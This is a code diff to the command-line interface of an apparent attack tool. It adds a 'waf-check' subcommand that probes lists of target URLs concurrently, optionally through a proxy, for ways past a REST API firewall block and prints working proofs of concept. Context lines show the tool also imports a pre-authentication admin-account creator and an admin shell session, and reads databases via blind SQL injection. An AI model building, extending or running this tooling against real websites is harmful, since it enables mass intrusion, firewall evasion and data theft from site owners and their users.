@@ -10,6 +10,7 @@ import sys
 from typing import List, Optional
 
 from . import __version__
+from . import waf_bypass
 from .client import BatchClient, TargetError
 from .exploit import PreAuthAdminCreator
 from .shell import AdminSession
@@ -265,6 +266,28 @@ def _check_one(url: str, args: argparse.Namespace) -> int:
     return 2
 
 
+def cmd_waf_check(args: argparse.Namespace) -> int:
+    try:
+        targets = _resolve_targets(args.url)
+    except ValueError as exc:
+        bad(str(exc))
+        return 2
+
+    info(f"Probing {len(targets)} target(s) for a bypassable REST API block (non-destructive)...")
+    results = waf_bypass.scan(targets, timeout=args.timeout, workers=args.workers, proxy=args.proxy)
+
+    if not results:
+        info("No bypass succeeded on any target.")
+        return 1
+
+    for target, successes in results.items():
+        good(target)
+        for success in successes:
+            print(f"    - {success['technique']} (HTTP {success['status']}): {success['poc']}")
+    warn(f"{len(results)}/{len(targets)} target(s) had a working bypass — see PoCs above.")
+    return 0
+
+
 def _reader(args: argparse.Namespace, client: BatchClient):
     """Pick the extraction technique.
 
@@ -493,6 +516,16 @@ def build_parser() -> argparse.ArgumentParser:
         help="also send an active SQLi confirmation payload",
     )
     check.set_defaults(func=cmd_check)
+
+    waf_check = sub.add_parser(
+        "waf-check",
+        help="probe a URL, or a file of URLs, for a bypassable REST API block (non-destructive)",
+    )
+    _add_common(waf_check)
+    waf_check.add_argument(
+        "--workers", type=int, default=16, help="concurrent target probes (default: 16)"
+    )
+    waf_check.set_defaults(func=cmd_waf_check)
 
     read = sub.add_parser("read", help="read from the database via blind SQL injection")
     _add_common(read)
